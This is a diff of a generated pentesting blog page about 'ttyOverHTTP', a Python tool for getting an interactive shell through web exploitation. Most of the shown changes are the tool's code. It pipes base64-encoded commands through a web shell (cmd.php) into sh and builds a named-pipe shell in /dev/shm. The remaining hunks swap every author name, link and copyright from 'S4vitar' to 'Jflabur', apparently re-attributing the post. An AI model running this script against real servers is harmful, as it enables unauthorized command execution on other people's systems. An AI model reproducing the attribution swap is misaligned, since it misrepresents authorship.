@@ -9,14 +9,14 @@
   <head>
     <meta charset="utf-8">
 
-<!-- begin _includes/seo.html --><title>ttyOverHTTP - Herramienta - s4vitar.io</title>
+<!-- begin _includes/seo.html --><title>ttyOverHTTP - Herramienta - jflabur.io</title>
 <meta name="description" content="Utilidad en Python para obtener una TTY totalmente interactiva mediante explotación web sin necesidad de entablarse una Reverse Shell.">
 
 
 
 <meta property="og:type" content="article">
 <meta property="og:locale" content="en_US">
-<meta property="og:site_name" content="s4vitar.io">
+<meta property="og:site_name" content="jflabur.io">
 <meta property="og:title" content="ttyOverHTTP - Herramienta">
 <meta property="og:url" content="http://localhost:4000/ttyoverhttp/">
 
@@ -31,7 +31,7 @@
 
 
 
-  <meta property="article:published_time" content="2020-02-04T00:00:00+00:00">
+  <meta property="article:published_time" content="2020-02-04T00:00:00+01:00">
 
 
 
@@ -54,7 +54,7 @@
     {
       "@context": "https://schema.org",
       "@type": "Person",
-      "name": "S4vitar",
+      "name": "Jflabur",
       "url": "http://localhost:4000",
       "sameAs": null
     }
@@ -69,7 +69,7 @@
 <!-- end _includes/seo.html -->
 
 
-<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="s4vitar.io Feed">
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="jflabur.io Feed">
 
 <!-- https://t.co/dKP3o1e -->
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -192,18 +192,18 @@
       
 
       
-        <img src="/assets/images/avatar.png" alt="S4vitar" itemprop="image">
+        <img src="/assets/images/avatar.png" alt="Jflabur" itemprop="image">
       
     </div>
   
 
   <div class="author__content">
     
-      <h3 class="author__name" itemprop="name">S4vitar</h3>
+      <h3 class="author__name" itemprop="name">Jflabur</h3>
     
     
       <p class="author__bio" itemprop="description">
-        Pentester / OSCP / OSWP
+        Pentester / OSCP / OSWP / eWPTxv2
       </p>
     
   </div>
@@ -234,7 +234,7 @@
 
       
         <li>
-          <a href="https://twitter.com/s4vitar" itemprop="sameAs" rel="nofollow noopener noreferrer">
+          <a href="https://twitter.com/jflabur" itemprop="sameAs" rel="nofollow noopener noreferrer">
             <i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter
           </a>
         </li>
@@ -246,7 +246,7 @@
 
       
         <li>
-          <a href="https://www.linkedin.com/in/s4vitar" itemprop="sameAs" rel="nofollow noopener noreferrer">
+          <a href="https://www.linkedin.com/in/jflabur" itemprop="sameAs" rel="nofollow noopener noreferrer">
             <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
           </a>
         </li>
@@ -262,7 +262,7 @@
 
       
         <li>
-          <a href="https://github.com/s4vitar" itemprop="sameAs" rel="nofollow noopener noreferrer">
+          <a href="https://github.com/jflabur" itemprop="sameAs" rel="nofollow noopener noreferrer">
             <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
           </a>
         </li>
@@ -285,7 +285,7 @@
       
         
           <li>
-            <a href="https://youtube.com/c/s4vitar" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <a href="https://youtube.com/c/jflabur" itemprop="sameAs" rel="nofollow noopener noreferrer">
               <i class="fab fa-fw fa-youtube" aria-hidden="true"></i> YouTube
             </a>
           </li>
@@ -336,7 +336,7 @@
         
         <p class="page__meta">
           
-            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2020-02-04T00:00:00+00:00">February 04, 2020 </time>&emsp;
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2020-02-04T00:00:00+01:00">February 04, 2020 </time>&emsp;
           
           
         </p>
@@ -555,46 +555,46 @@
 
 <span class="k">class</span> <span class="nc">AllTheReads</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
 	<span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">interval</span><span class="o">=</span><span class="mi">1</span><span class="p">):</span>
-		<span class="bp">self</span><span class="o">.</span><span class="n">interval</span> <span class="o">=</span> <span class="n">interval</span>
-		<span class="n">thread</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">run</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">())</span>
-		<span class="n">thread</span><span class="o">.</span><span class="n">daemon</span> <span class="o">=</span> <span class="bp">True</span>
-		<span class="n">thread</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+		<span class="bp">self</span><span class="p">.</span><span class="n">interval</span> <span class="o">=</span> <span class="n">interval</span>
+		<span class="n">thread</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="bp">self</span><span class="p">.</span><span class="n">run</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">())</span>
+		<span class="n">thread</span><span class="p">.</span><span class="n">daemon</span> <span class="o">=</span> <span class="bp">True</span>
+		<span class="n">thread</span><span class="p">.</span><span class="n">start</span><span class="p">()</span>
 
 	<span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
-		<span class="n">readoutput</span> <span class="o">=</span> <span class="s">"""/bin/cat </span><span class="si">%</span><span class="s">s"""</span> <span class="o">%</span> <span class="p">(</span><span class="n">stdout</span><span class="p">)</span>
-		<span class="n">clearoutput</span> <span class="o">=</span> <span class="s">"""echo '' &gt; </span><span class="si">%</span><span class="s">s"""</span> <span class="o">%</span> <span class="p">(</span><span class="n">stdout</span><span class="p">)</span>
+		<span class="n">readoutput</span> <span class="o">=</span> <span class="s">"""/bin/cat %s"""</span> <span class="o">%</span> <span class="p">(</span><span class="n">stdout</span><span class="p">)</span>
+		<span class="n">clearoutput</span> <span class="o">=</span> <span class="s">"""echo '' &gt; %s"""</span> <span class="o">%</span> <span class="p">(</span><span class="n">stdout</span><span class="p">)</span>
 		<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
 			<span class="n">output</span> <span class="o">=</span> <span class="n">RunCmd</span><span class="p">(</span><span class="n">readoutput</span><span class="p">)</span>
 			<span class="k">if</span> <span class="n">output</span><span class="p">:</span>
 				<span class="n">RunCmd</span><span class="p">(</span><span class="n">clearoutput</span><span class="p">)</span>
 				<span class="k">print</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
-			<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">interval</span><span class="p">)</span>
+			<span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">interval</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">RunCmd</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>
-	<span class="n">cmd</span> <span class="o">=</span> <span class="n">cmd</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
-	<span class="n">cmd</span> <span class="o">=</span> <span class="n">b64encode</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
+	<span class="n">cmd</span> <span class="o">=</span> <span class="n">cmd</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
+	<span class="n">cmd</span> <span class="o">=</span> <span class="n">b64encode</span><span class="p">(</span><span class="n">cmd</span><span class="p">).</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
 	<span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
-        	<span class="s">'cmd'</span> <span class="p">:</span> <span class="s">'echo "</span><span class="si">%</span><span class="s">s" | base64 -d | sh'</span> <span class="o">%</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+        	<span class="s">'cmd'</span> <span class="p">:</span> <span class="s">'echo "%s" | base64 -d | sh'</span> <span class="o">%</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
 		<span class="p">}</span>
-	<span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">'http://127.0.0.1/cmd.php'</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">payload</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span><span class="o">.</span><span class="n">text</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+	<span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'http://127.0.0.1/cmd.php'</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">payload</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">).</span><span class="n">text</span><span class="p">).</span><span class="n">strip</span><span class="p">()</span>
 	<span class="k">return</span> <span class="n">result</span>
 
 <span class="k">def</span> <span class="nf">WriteCmd</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>
-	<span class="n">cmd</span> <span class="o">=</span> <span class="n">cmd</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
-	<span class="n">cmd</span> <span class="o">=</span> <span class="n">b64encode</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
+	<span class="n">cmd</span> <span class="o">=</span> <span class="n">cmd</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
+	<span class="n">cmd</span> <span class="o">=</span> <span class="n">b64encode</span><span class="p">(</span><span class="n">cmd</span><span class="p">).</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
 	<span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
-		<span class="s">'cmd'</span> <span class="p">:</span> <span class="s">'echo "</span><span class="si">%</span><span class="s">s" | base64 -d &gt; </span><span class="si">%</span><span class="s">s'</span> <span class="o">%</span> <span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">stdin</span><span class="p">)</span>
+		<span class="s">'cmd'</span> <span class="p">:</span> <span class="s">'echo "%s" | base64 -d &gt; %s'</span> <span class="o">%</span> <span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">stdin</span><span class="p">)</span>
 	<span class="p">}</span>
-	<span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">'http://127.0.0.1/cmd.php'</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">payload</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span><span class="o">.</span><span class="n">text</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+	<span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'http://127.0.0.1/cmd.php'</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">payload</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">).</span><span class="n">text</span><span class="p">).</span><span class="n">strip</span><span class="p">()</span>
 	<span class="k">return</span> <span class="n">result</span>
 
 <span class="k">def</span> <span class="nf">ReadCmd</span><span class="p">():</span>
-        <span class="n">GetOutput</span> <span class="o">=</span> <span class="s">"""/bin/cat </span><span class="si">%</span><span class="s">s"""</span> <span class="o">%</span> <span class="p">(</span><span class="n">stdout</span><span class="p">)</span>
+        <span class="n">GetOutput</span> <span class="o">=</span> <span class="s">"""/bin/cat %s"""</span> <span class="o">%</span> <span class="p">(</span><span class="n">stdout</span><span class="p">)</span>
         <span class="n">output</span> <span class="o">=</span> <span class="n">RunCmd</span><span class="p">(</span><span class="n">GetOutput</span><span class="p">)</span>
         <span class="k">return</span> <span class="n">output</span>
 
 <span class="k">def</span> <span class="nf">SetupShell</span><span class="p">():</span>
-	<span class="n">NamedPipes</span> <span class="o">=</span> <span class="s">"""mkfifo </span><span class="si">%</span><span class="s">s; tail -f </span><span class="si">%</span><span class="s">s | /bin/sh 2&gt;&amp;1 &gt; </span><span class="si">%</span><span class="s">s"""</span> <span class="o">%</span> <span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="n">stdin</span><span class="p">,</span> <span class="n">stdout</span><span class="p">)</span>
+	<span class="n">NamedPipes</span> <span class="o">=</span> <span class="s">"""mkfifo %s; tail -f %s | /bin/sh 2&gt;&amp;1 &gt; %s"""</span> <span class="o">%</span> <span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="n">stdin</span><span class="p">,</span> <span class="n">stdout</span><span class="p">)</span>
 	<span class="k">try</span><span class="p">:</span>
 		<span class="n">RunCmd</span><span class="p">(</span><span class="n">NamedPipes</span><span class="p">)</span>
 	<span class="k">except</span><span class="p">:</span>
@@ -603,10 +603,10 @@
 
 <span class="k">global</span> <span class="n">stdin</span><span class="p">,</span> <span class="n">stdout</span>
 <span class="n">session</span> <span class="o">=</span> <span class="n">randrange</span><span class="p">(</span><span class="mi">1000</span><span class="p">,</span> <span class="mi">9999</span><span class="p">)</span>
-<span class="n">stdin</span> <span class="o">=</span> <span class="s">"/dev/shm/input.</span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="p">(</span><span class="n">session</span><span class="p">)</span>
-<span class="n">stdout</span> <span class="o">=</span> <span class="s">"/dev/shm/output.</span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="p">(</span><span class="n">session</span><span class="p">)</span>
-<span class="n">erasestdin</span> <span class="o">=</span> <span class="s">"""/bin/rm </span><span class="si">%</span><span class="s">s"""</span> <span class="o">%</span> <span class="p">(</span><span class="n">stdin</span><span class="p">)</span>
-<span class="n">erasestdout</span> <span class="o">=</span> <span class="s">"""/bin/rm </span><span class="si">%</span><span class="s">s"""</span> <span class="o">%</span> <span class="p">(</span><span class="n">stdout</span><span class="p">)</span>
+<span class="n">stdin</span> <span class="o">=</span> <span class="s">"/dev/shm/input.%s"</span> <span class="o">%</span> <span class="p">(</span><span class="n">session</span><span class="p">)</span>
+<span class="n">stdout</span> <span class="o">=</span> <span class="s">"/dev/shm/output.%s"</span> <span class="o">%</span> <span class="p">(</span><span class="n">session</span><span class="p">)</span>
+<span class="n">erasestdin</span> <span class="o">=</span> <span class="s">"""/bin/rm %s"""</span> <span class="o">%</span> <span class="p">(</span><span class="n">stdin</span><span class="p">)</span>
+<span class="n">erasestdout</span> <span class="o">=</span> <span class="s">"""/bin/rm %s"""</span> <span class="o">%</span> <span class="p">(</span><span class="n">stdout</span><span class="p">)</span>
 
 <span class="n">SetupShell</span><span class="p">()</span>
 
@@ -618,14 +618,14 @@
 	<span class="n">RunCmd</span><span class="p">(</span><span class="n">erasestdin</span><span class="p">)</span>
 	<span class="n">RunCmd</span><span class="p">(</span><span class="n">erasestdout</span><span class="p">)</span>
 	<span class="k">print</span><span class="p">(</span><span class="s">"[*] All files have been deleted</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
-	<span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+	<span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
 
-<span class="n">signal</span><span class="o">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="o">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">sig_handler</span><span class="p">)</span>
+<span class="n">signal</span><span class="p">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="p">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">sig_handler</span><span class="p">)</span>
 
 <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
 	<span class="n">cmd</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>
 	<span class="n">WriteCmd</span><span class="p">(</span><span class="n">cmd</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
-	<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">1.1</span><span class="p">)</span>
+	<span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">1.1</span><span class="p">)</span>
 </code></pre></div></div>
 
 <ul>
@@ -756,7 +756,7 @@
 
 
         
-          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2020-02-04T00:00:00+00:00">February 04, 2020</time></p>
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2020-02-04T00:00:00+01:00">February 04, 2020</time></p>
         
       </footer>
 
@@ -801,7 +801,7 @@
   </ul>
 </div>
 
-<div class="page__footer-copyright">&copy; 2020 S4vitar</div>
+<div class="page__footer-copyright">&copy; 2020 Jflabur</div>
 
       </footer>
     </div>
